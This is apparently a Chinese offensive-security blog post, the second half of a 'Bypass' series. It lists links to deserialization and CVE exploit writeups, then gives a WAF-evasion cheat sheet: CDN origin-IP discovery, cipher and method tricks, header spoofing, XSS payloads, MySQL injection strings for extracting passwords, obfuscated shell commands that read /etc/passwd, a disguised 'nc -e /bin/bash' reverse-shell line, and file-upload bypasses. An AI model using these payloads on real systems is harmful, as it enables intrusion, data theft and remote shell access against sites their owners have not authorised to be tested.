从入门到入狱系列4-攻防对抗之Bypass-下篇</h4><p>各家厂商早期针对流量层查杀 webshel的原理：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6550</span></code></pre><hr><h4 id="Java反序列化过程深究"><a href="#Java反序列化过程深究" class="headerlink" title="Java反序列化过程深究"></a>Java反序列化过程深究</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.sohu.com<span class="hljs-regexp">/a/</span><span class="hljs-number">357066711</span>_257305</code></pre><p>CVE-2017-3248<br>CVE-2017-3248</p><p><strong>防护建议</strong></p><pre><code class="hljs plain">可以在resolveclass和resovleproxyclass增加一些反序列化利用类的黑名单检查</code></pre><hr><h4 id="Apache-Slor不安全配置远程代码执行漏洞复现及jmx-rmi利用分析"><a href="#Apache-Slor不安全配置远程代码执行漏洞复现及jmx-rmi利用分析" class="headerlink" title="Apache Slor不安全配置远程代码执行漏洞复现及jmx rmi利用分析"></a>Apache Slor不安全配置远程代码执行漏洞复现及jmx rmi利用分析</h4><p>CVE-2019-12409</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://wemp.app/posts/<span class="hljs-number">008</span>ae<span class="hljs-number">6</span>ed-<span class="hljs-number">9</span>eee-<span class="hljs-number">4</span>fc<span class="hljs-number">4</span>-<span class="hljs-number">911</span>c-<span class="hljs-number">7</span>c<span class="hljs-number">603</span>c<span class="hljs-number">8</span>b<span class="hljs-number">884</span>a?utm_source=bottom-latest-posts</code></pre><p>该文章详细讲解复现！！！</p><hr><h4 id="java命令执行小细节"><a href="#java命令执行小细节" class="headerlink" title="java命令执行小细节"></a>java命令执行小细节</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.baizhiedu.com<span class="hljs-regexp">/article/</span><span class="hljs-number">1029</span></code></pre><p>学习查看知识点，广告可以忽视！！！</p><hr><h4 id="JDK反序列化Gadgets-7u21"><a href="#JDK反序列化Gadgets-7u21" class="headerlink" title="JDK反序列化Gadgets-7u21"></a>JDK反序列化Gadgets-7u21</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6884</span></code></pre><p>详细，真详细的文章！！</p><p>参考</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/vuls/</span><span class="hljs-number">175754</span>.html
https:<span class="hljs-regexp">//</span>b1ue.cn<span class="hljs-regexp">/archives/</span><span class="hljs-number">176</span>.html
https:<span class="hljs-regexp">//gi</span>st.github.com<span class="hljs-regexp">/frohoff/</span><span class="hljs-number">24</span>af7913611f8406eaf3
https:<span class="hljs-regexp">//</span>sec.xiaomi.com<span class="hljs-regexp">/article/</span><span class="hljs-number">41</span>
https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/rickiyang/</span>p/<span class="hljs-number">11336268</span>.html   ---javassist使用全解析</code></pre><hr><h4 id="Weblogic-T3-CVE-2019-2890-Analysis"><a href="#Weblogic-T3-CVE-2019-2890-Analysis" class="headerlink" title="Weblogic-T3-CVE-2019-2890-Analysis"></a>Weblogic-T3-CVE-2019-2890-Analysis</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6904</span></code></pre><p>详细复现！！</p><hr><h4 id="spring-boot-actuators未授权漏洞"><a href="#spring-boot-actuators未授权漏洞" class="headerlink" title="spring-boot-actuators未授权漏洞"></a>spring-boot-actuators未授权漏洞</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">3162</span>ce30a853
https:<span class="hljs-regexp">//</span>www.veracode.com<span class="hljs-regexp">/blog/</span>research/exploiting-spring-boot-actuators</code></pre><hr><h4 id="SEMCMS2-6后台文件上传漏洞审计"><a href="#SEMCMS2-6后台文件上传漏洞审计" class="headerlink" title="SEMCMS2.6后台文件上传漏洞审计"></a>SEMCMS2.6后台文件上传漏洞审计</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cesafe.com<span class="hljs-regexp">/html/</span><span class="hljs-number">6190</span>.html
https:<span class="hljs-regexp">//</span>www.yir6.cn<span class="hljs-regexp">/Web/</span><span class="hljs-number">347</span>.html   --Admin/SEMCMS_Upfile.php代码分析</code></pre><hr><h4 id="代码审计之lvyecms后台getshell"><a href="#代码审计之lvyecms后台getshell" class="headerlink" title="代码审计之lvyecms后台getshell"></a>代码审计之lvyecms后台getshell</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.wenwenya.com<span class="hljs-regexp">/anquan/</span><span class="hljs-number">516051</span>.html
https:<span class="hljs-regexp">//</span>webcache.googleusercontent.com<span class="hljs-regexp">/search?q=cache:9JJuN-bvrgwJ:https:/</span><span class="hljs-regexp">/www.secshi.com/</span><span class="hljs-number">22396</span>.html+&amp;cd=<span class="hljs-number">3</span>&amp;hl=zh-CN&amp;ct=clnk&amp;gl=hk</code></pre><hr><h4 id="Log4j-Unserialize-Analysis"><a href="#Log4j-Unserialize-Analysis" class="headerlink" title="Log4j-Unserialize-Analysis"></a>Log4j-Unserialize-Analysis</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7004</span>
https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4587690</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">4452130</span></code></pre><p>两篇文章内容一致！详细介绍了CVE-2019-17571、CVE-2017-5645</p><hr><h4 id="JAVA反序列化-FastJson组件"><a href="#JAVA反序列化-FastJson组件" class="headerlink" title="JAVA反序列化- FastJson组件"></a>JAVA反序列化- FastJson组件</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7027</span></code></pre><p>非常难，内容非常多！！！加油！！！这块比较难</p><hr><h4 id="Spring-securiy-oauth2-CVE-2018-1260"><a href="#Spring-securiy-oauth2-CVE-2018-1260" class="headerlink" title="Spring-securiy-oauth2 (CVE-2018-1260)"></a>Spring-securiy-oauth2 (CVE-2018-1260)</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.spoock.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">05</span><span class="hljs-regexp">/13/</span>cve-<span class="hljs-number">2018</span>-<span class="hljs-number">1260</span>/</code></pre><p>文章内容复现类似，可分析查看…</p><hr><h3 id="WAF-bypass"><a href="#WAF-bypass" class="headerlink" title="WAF-bypass"></a>WAF-bypass</h3><p><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/06.png" srcset="/img/loading.gif" alt="bypasswaf"></p><h4 id="找真实IP，绕过CDN"><a href="#找真实IP，绕过CDN" class="headerlink" title="找真实IP，绕过CDN"></a>找真实IP，绕过CDN</h4><p>云waf一般可以通过此方法绕过</p><p><strong>识别CDN</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">ping</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>
<span class="hljs-selector-tag">dig</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> 
<span class="hljs-selector-tag">nslookup</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span></code></pre><p>或者使用站长工具查看IP是否唯一等</p><p><strong>寻找真实的IP</strong><br>DNS历史解析记录<br>寻找DNS历史记录，找到后修改hos文件即可：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>site.ip138.com/www.baidu.com 
https:<span class="hljs-regexp">//</span>dnsdb.io<span class="hljs-regexp">/zh-cn/</span> 
https:<span class="hljs-regexp">//</span>x.threatbook.cn/ 
http:<span class="hljs-regexp">//</span>toolbar.netcraft.com/site_report?url= 
https:<span class="hljs-regexp">//</span>censys.io/ipv4?q=www.baidu.com 
http:<span class="hljs-regexp">//</span>viewdns.info/
https:<span class="hljs-regexp">//</span>community.riskiq.com/home 
https:<span class="hljs-regexp">//</span>securitytrails.com<span class="hljs-regexp">/list/</span>apex_domain/jgbz.baidu.com</code></pre><p><strong>RSS邮箱订阅，查看邮件源码</strong><br>一般也会得到真实的IP地址，通过rss订阅的方式，可以查找到订阅的消息中真实IP<br>或者在原始信息-头信息中（unknown[xx.xx.xx.xxIP])信息</p><p><strong>服务器向外请求（DNSLOG）</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Xy--1/</span>p/<span class="hljs-number">12896599</span>.html</code></pre><p><strong>同网段子域名信息</strong><br>DNS服务器域名信息：</p><pre><code class="hljs nginx"><span class="hljs-attribute">google</span> Public DNS（<span class="hljs-number">8.8.8.8</span>，<span class="hljs-number">8.8.4.4</span>）
OpenDNS（<span class="hljs-number">208.67.222.222</span>，<span class="hljs-number">208.67.220.220</span>）
OpenDNS Family（<span class="hljs-number">208.67.222.123</span>，<span class="hljs-number">208.67.220.123</span>）
Dyn DNS（<span class="hljs-number">216.146.35.35</span>，<span class="hljs-number">216.146.36.36</span>）
Comodo Secure（<span class="hljs-number">8.26.56.26</span>，<span class="hljs-number">8.20.247.20</span>）
UltraDNS（<span class="hljs-number">156.154.70.1</span>，<span class="hljs-number">156.154.71.1</span>）
Norton ConnectSafe（<span class="hljs-number">199.85.126.10</span>，<span class="hljs-number">199.85.127.10</span>）</code></pre><h4 id="https降级绕过"><a href="#https降级绕过" class="headerlink" title="https降级绕过"></a>https降级绕过</h4><p>可能https有waf，http没有</p><hr><h4 id="ssl问题绕过"><a href="#ssl问题绕过" class="headerlink" title="ssl问题绕过"></a>ssl问题绕过</h4><p>所以选用一个WAF不支持但是服务器支持的算法，选用<code>TLSv1 256 bits ECDHE-RSA-AES256-SHA</code>。就可以是WAF无法识别导致绕过</p><pre><code class="hljs awk">curl --ciphers ECDHE-RSA-AES256-SHA https:<span class="hljs-regexp">//</span>waf-test.lab.local/ssl-cipher-test</code></pre><p><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/07.png" srcset="/img/loading.gif" alt="bypasswaf"><br>WAF支持的算法如下：<br><strong>SSLv3</strong></p><pre><code class="hljs autohotkey">SSL_RS<span class="hljs-built_in">A_WITH</span>_NULL_MD5
SSL_RS<span class="hljs-built_in">A_WITH</span>_NULL_SHA
SSL_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_MD5
SSL_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_SHA
SSL_RS<span class="hljs-built_in">A_WITH</span>_DES_CBC_SHA
SSL_RS<span class="hljs-built_in">A_WITH</span>_3DES_EDE_CBC_SHA
SSL_RS<span class="hljs-built_in">A_EXPORT</span>_WITH_RC4_40_MD5
SSL_RS<span class="hljs-built_in">A_EXPORT</span>_WITH_DES40_CBC_SHA</code></pre><p><strong>TLS/1.0-1.2</strong></p><pre><code class="hljs autohotkey">TLS_RS<span class="hljs-built_in">A_WITH</span>_NULL_SHA256
TLS_RS<span class="hljs-built_in">A_WITH</span>_AES_128_CBC_SHA
TLS_RS<span class="hljs-built_in">A_WITH</span>_AES_256_CBC_SHA
TLS_RS<span class="hljs-built_in">A_EXPORT1024</span>_WITH_RC4_56_MD5
TLS_RS<span class="hljs-built_in">A_EXPORT1024</span>_WITH_RC4_56_SHA
TLS_RS<span class="hljs-built_in">A_WITH</span>_AES_128_CBC_SHA256
TLS_RS<span class="hljs-built_in">A_WITH</span>_AES_256_CBC_SHA256
TLS_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_MD5 = &#123; <span class="hljs-number">0</span>x000x04 &#125;
TLS_RS<span class="hljs-built_in">A_WITH</span>_RC4_128_SHA = &#123; <span class="hljs-number">0</span>x000x05 &#125;
TLS_RS<span class="hljs-built_in">A_WITH</span>_DES_CBC_SHA = &#123; <span class="hljs-number">0</span>x000x09 &#125;</code></pre><p>参考文章：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xdxd.love<span class="hljs-regexp">/2018/</span><span class="hljs-number">09</span><span class="hljs-regexp">/10/</span>利用SSL问题绕过WAF文章分析/</code></pre><hr><h4 id="method-绕过"><a href="#method-绕过" class="headerlink" title="method 绕过"></a>method 绕过</h4><p>1）改变method，get改post，post 改上传（还有cookies传值）<br>2）改变method为不规则，比如改get，post为HELLLOXX等（某些apache版本）</p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>/xxx/?id=<span class="hljs-number">1</span>+and+sleep(<span class="hljs-number">3</span>) HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
<span class="hljs-attribute">DigApis</span> /xxx/?id=<span class="hljs-number">1</span>+and+sleep(<span class="hljs-number">3</span>)HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span></code></pre><h4 id="Heard-IP-绕过-一般应用拦截，非WAF"><a href="#Heard-IP-绕过-一般应用拦截，非WAF" class="headerlink" title="Heard IP 绕过(一般应用拦截，非WAF)"></a>Heard IP 绕过(一般应用拦截，非WAF)</h4><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-forwarded-for：<span class="hljs-number">127.0.0.1</span> 
<span class="hljs-attribute">X</span>-remote-IP：<span class="hljs-number">127.0.0.1</span> 
<span class="hljs-attribute">X</span>-originating-IP：<span class="hljs-number">127.0.0.1</span> 
<span class="hljs-attribute">x</span>-remote-addr：<span class="hljs-number">127.0.0.1</span>
<span class="hljs-attribute">x</span>-client-ip：<span class="hljs-number">127.0.0.1</span></code></pre><p><strong>Heard content-type 绕过</strong></p><pre><code class="hljs fortran">content-<span class="hljs-keyword">type</span>为空 
content-<span class="hljs-keyword">type</span>改成其他的 
content-<span class="hljs-keyword">type</span>必须指定唯一一个类型，例如 application/ octet-stream（比如安全狗）
content-<span class="hljs-keyword">type</span>改成不规则的text/htm1xxxxxx
Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span> ; boundary=<span class="hljs-number">0000</span> 
Content-<span class="hljs-keyword">Type</span>：mUltiPart/<span class="hljs-keyword">ForM</span>-<span class="hljs-keyword">dATa</span>；boundary=<span class="hljs-number">0000</span> 
Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-datax；boundary=<span class="hljs-number">0000</span> 
Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>，boundary=<span class="hljs-number">0000</span> 
Content-<span class="hljs-keyword">Type</span>：multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span> boundary=<span class="hljs-number">0000</span> 
content-<span class="hljs-keyword">Type</span>：multipart/whatever；boundary=<span class="hljs-number">0000</span>
content-<span class="hljs-keyword">Type</span>：multipart/； boundary=<span class="hljs-number">0000</span>
content-<span class="hljs-keyword">Type</span>: application/octet-stream；</code></pre><hr><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>基础常用的常规语句</p><pre><code class="hljs perl">?id=alert(document[<span class="hljs-string">&#x27;cookie&#x27;</span>]) 
?id=<span class="hljs-string">&quot;;location=location.hash)//#0=&#123;&#125;;alert(0) </span>
<span class="hljs-string">?id=%&quot;;eval(unescape(location))//#%0Aalert(0) </span>
<span class="hljs-string">?id=&lt;script&lt;&#123;alert(1)&#125;/&gt;&lt;/script&gt; </span>
<span class="hljs-string">?id=&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;</span>
<span class="hljs-string">?id=%3cscript%3ealert(1)%3c%2fscript%3c </span>
<span class="hljs-string">?id=&lt;a href=&quot;</span>javas&amp;<span class="hljs-comment">#99;ript&amp;#35;alert(1);&quot;&gt;</span>
id=%253c%2573%2563%2572%2569%257<span class="hljs-number">0</span>%2574%253e%2561%256c%2565%2572%2574%2528%2531%2529%253c%252f%2573%2563%2572%2569%257<span class="hljs-number">0</span>%2574%253e
?id=&lt;object+data=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;&lt;<span class="hljs-regexp">/object&gt;</span>
<span class="hljs-regexp">?id=1234&amp;&quot;&gt;&lt;script&gt;alert(1)&lt;/script</span>&gt;=<span class="hljs-number">1234</span>     <span class="hljs-comment">#参数名</span></code></pre><p>直接在文件名例如asp、php后加即可绕过<br>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/lcamry/</span>articles/<span class="hljs-number">5622244</span>.html</code></pre><hr><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><p>简单判别诸如点以及数据库类型 ：</p><pre><code class="hljs gherkin">数据库类型丨连接符丨注释符号丨其他特殊方式丨唯一的默认表变量和函数 
MSSQL|<span class="hljs-string"> %2B (URL加号编码) </span>|<span class="hljs-string"> -- </span>|<span class="hljs-string"> 待补充丨@@PACK_RECEIVED </span>
<span class="hljs-string">MYSQL</span>|<span class="hljs-string"> %20 (URL空格编码)丨# / -- </span>|<span class="hljs-string"> 待补充 </span>|<span class="hljs-string">  CONNECTION_ID() </span>
<span class="hljs-string">Oracle I %7C (URL竖线编码) </span>|<span class="hljs-string"> -- 待补充 </span>|<span class="hljs-string"> BITAND(1,1) </span>
<span class="hljs-string">PGsql </span>|<span class="hljs-string"> %7C (URL竖线编码) </span>|<span class="hljs-string"> -- </span>|<span class="hljs-string">ad1::int=1 </span>|<span class="hljs-string"> getpgusername() </span>
<span class="hljs-string">Access </span>|<span class="hljs-string"> %26 (URL与号编码) </span>|<span class="hljs-string"> N/A </span>|<span class="hljs-string"> 待补充 </span>|<span class="hljs-string"> msysobjects</span></code></pre><p>为避免被wa拦截以及封禁P,注入建议不首先使用<code>and</code>以及<code>or</code>语句。</p><p>可用如下方式替换：</p><p><strong>数字型注入：</strong></p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=2*2
?<span class="hljs-attribute">id</span>=4</code></pre><p><strong>字符型注入，根据上表判断</strong></p><pre><code class="hljs powershell">?key=wo<span class="hljs-string">&#x27;+&#x27;</span><span class="hljs-built_in">rd</span>
?key=wo<span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-built_in">rd</span>
?key=wo<span class="hljs-string">&#x27; &#x27;</span><span class="hljs-built_in">rd</span></code></pre><hr><h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=ord(<span class="hljs-string">&#x27;a&#x27;</span>)=<span class="hljs-number">97</span> 
<span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>+AND+<span class="hljs-number">1</span>=<span class="hljs-number">1</span> 
<span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>+&amp;&amp;+<span class="hljs-number">1</span>=<span class="hljs-number">1</span> 
<span class="hljs-built_in">?id</span>=<span class="hljs-string">&#x27;=’</span>
<span class="hljs-string">?id=123+AND+md5(‘a’)!= md5(‘A’) </span>
<span class="hljs-string">?id=123+and+len(@@version)&gt;1 </span>
<span class="hljs-string">?id=1’||1=’1 </span>
<span class="hljs-string">?id=123‘+like+&#x27;</span><span class="hljs-number">123</span> 
<span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span><span class="hljs-string">&#x27;+not+like+&#x27;</span><span class="hljs-number">1234</span> 
<span class="hljs-built_in">?id</span>=<span class="hljs-string">&#x27;aaa&#x27;</span>&lt;&gt;<span class="hljs-string">&#x27;bbb&#x27;</span>
<span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>/*! <span class="hljs-keyword">union</span> all select version() */-- 
<span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span>/*!<span class="hljs-keyword">or</span>*/<span class="hljs-number">1</span>=<span class="hljs-number">1</span>; 
<span class="hljs-built_in">?id</span>=(<span class="hljs-number">1</span>)<span class="hljs-keyword">union</span>(((((((select(<span class="hljs-number">1</span>), hex(hash)from(users))))))))       ---<span class="hljs-number">7</span>个+<span class="hljs-number">8</span>个括号 
<span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span>+<span class="hljs-keyword">union</span>+(select’<span class="hljs-number">1</span>‘<span class="hljs-built_in">,concat</span>(login,hash)from+users) 
<span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span>+<span class="hljs-meta">%55nion</span>(<span class="hljs-meta">%53elect</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)-- -
<span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span>/*!<span class="hljs-number">000000</span><span class="hljs-keyword">union</span>*/select<span class="hljs-meta">%0d</span><span class="hljs-meta">%0a</span>/*asdas/asd asasd*/version() 
<span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span>(select<span class="hljs-meta">%0aall</span>&#123;x users&#125;from&#123;x ddd&#125;)</code></pre><p><strong>Mysql常用函数</strong><br>字符串处理：</p><pre><code class="hljs routeros">?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1)=<span class="hljs-string">&#x27;*&#x27;</span>
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1)=0x2a
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1)=unhex(<span class="hljs-string">&#x27;2a&#x27;</span>) 
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1) regexp <span class="hljs-string">&#x27;[*]&#x27;</span>
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1) like <span class="hljs-string">&#x27;*&#x27;</span> 
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid(password,1,1) rlike <span class="hljs-string">&#x27;[*]&#x27;</span>
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> ord(mid(password,1,1))=42 
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> ascii(mid(password,1,1))=42 
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> find_in_set(<span class="hljs-string">&#x27;2a&#x27;</span>,hex(mid(password,1,1)))=1
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> position(0x2a <span class="hljs-keyword">in</span> password)=1
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> locate(ox2a,password)=1
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> substring((select <span class="hljs-string">&#x27;password&#x27;</span>),1,1) = 0x70 
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> substr((select <span class="hljs-string">&#x27;password&#x27;</span>),1,1) = 0x70 
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> mid((select <span class="hljs-string">&#x27;password&#x27;</span>),1,1) = 0x70 
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,1), 0X69) = 1 
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,1), 0×70) = 0
?<span class="hljs-attribute">key</span>=user&#x27; <span class="hljs-keyword">OR</span> strcmp(left(<span class="hljs-string">&#x27;password&#x27;</span>,1), 0x71) = -1</code></pre><hr><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><strong>‘ （单引号）以及 \ （反斜杠）绕过</strong></p><pre><code class="hljs groovy">$ echo orleven 
orleven

$ echo o<span class="hljs-string">&#x27;r&#x27;</span>l<span class="hljs-string">&#x27;e&#x27;</span>v<span class="hljs-string">&#x27;e&#x27;</span>n<span class="hljs-string">&#x27;&#x27;</span>
oreven 

$ <span class="hljs-regexp">/b&#x27;i&#x27;n/</span>c<span class="hljs-string">&#x27;a&#x27;</span>t <span class="hljs-regexp">/e&#x27;t&#x27;c/</span>p<span class="hljs-string">&#x27;a&#x27;</span>s<span class="hljs-string">&#x27;s&#x27;</span>w<span class="hljs-string">&#x27;d&#x27;</span> 
<span class="hljs-attr">root:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: <span class="hljs-attr">root:</span> <span class="hljs-regexp">/root:/</span>bin/bash 
<span class="hljs-attr">daemon:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: <span class="hljs-attr">daemon:</span> <span class="hljs-regexp">/usr/</span><span class="hljs-attr">sbin:</span> <span class="hljs-regexp">/usr/</span>sbin/nologin 
<span class="hljs-attr">bin:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: <span class="hljs-attr">bin:</span><span class="hljs-regexp">/bin: /</span>usr<span class="hljs-regexp">/sbin/</span>nologin 

$ <span class="hljs-regexp">/b\i\n/</span>c\at <span class="hljs-regexp">/et&#x27;c&#x27;/</span>pa<span class="hljs-string">&#x27;s&#x27;</span>swd 
<span class="hljs-attr">root:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: <span class="hljs-attr">root:</span> <span class="hljs-regexp">/root: /</span>bin/bash 
<span class="hljs-attr">daemon:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: <span class="hljs-attr">daemon:</span> <span class="hljs-regexp">/usr/</span><span class="hljs-attr">sbin:</span> <span class="hljs-regexp">/usr/</span>sbin/nologin 
<span class="hljs-attr">bin:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: <span class="hljs-attr">bin:</span><span class="hljs-regexp">/bin: /</span>usr<span class="hljs-regexp">/sbin/</span>nologin</code></pre><hr><p><strong>? 、 * 、 [、 ]、 ^、 - 通配符绕过</strong></p><p>问号最好只匹配到唯一一条</p><pre><code class="hljs gradle">$ <span class="hljs-regexp">/b??/</span>c?t <span class="hljs-regexp">/etc/</span>??ss?d
root: X: <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: root: <span class="hljs-regexp">/root: /</span>bin/bash 
daemon: x: <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: daemon: <span class="hljs-regexp">/usr/</span>sbin: <span class="hljs-regexp">/usr/</span>sbin/nologin 
bin: X: <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: bin:<span class="hljs-regexp">/bin: /u</span>sr<span class="hljs-regexp">/sbin/</span>nologin 

$ <span class="hljs-regexp">/???/</span>n? -e <span class="hljs-regexp">/???/</span>b??h <span class="hljs-number">2130706433</span> <span class="hljs-number">1337</span> # <span class="hljs-regexp">/bin/</span>nc -e <span class="hljs-regexp">/bin/</span>bash <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1337</span></code></pre><hr><p><strong>$ 不存在的符号</strong></p><pre><code class="hljs groovy">cat $u<span class="hljs-regexp">/etc$u/</span>passwd$u 

<span class="hljs-attr">root:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">0</span>: <span class="hljs-number">0</span>: <span class="hljs-attr">root:</span> <span class="hljs-regexp">/root: /</span>bin/bash 
<span class="hljs-attr">daemon:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">1</span>: <span class="hljs-number">1</span>: <span class="hljs-attr">daemon:</span> <span class="hljs-regexp">/usr/</span><span class="hljs-attr">sbin:</span> <span class="hljs-regexp">/usr/</span>sbin/nologin 
<span class="hljs-attr">bin:</span> <span class="hljs-attr">x:</span> <span class="hljs-number">2</span>: <span class="hljs-number">2</span>: <span class="hljs-attr">bin:</span> <span class="hljs-regexp">/bin: /</span>usr<span class="hljs-regexp">/sbin/</span>nologin</code></pre><p><strong>; 分号执行</strong></p><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>cat /etc/passwd;ls 

.......

<span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110:115</span><span class="hljs-symbol">:MySQL</span> Serve,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span> 

a.out go gobuster gopath soft sqlmap.log tool</code></pre><hr><h4 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h4><p><strong>文件名绕过</strong></p><pre><code class="hljs perl"><span class="hljs-number">1</span>）文件名加回车
<span class="hljs-number">2</span>）shell.php(%80-%99).jpg 绕过
<span class="hljs-number">3</span>）如果有改名功能，可先上传正常文件，再改名 
<span class="hljs-number">4</span>）%00
<span class="hljs-number">5</span>）<span class="hljs-number">00</span>(<span class="hljs-keyword">hex</span>)
<span class="hljs-number">6</span>）长文件名（windows <span class="hljs-number">258</span>byte | linux <span class="hljs-number">4096</span>byte ），可使用非字母数字，比如中文等最大程
度的拉长。 
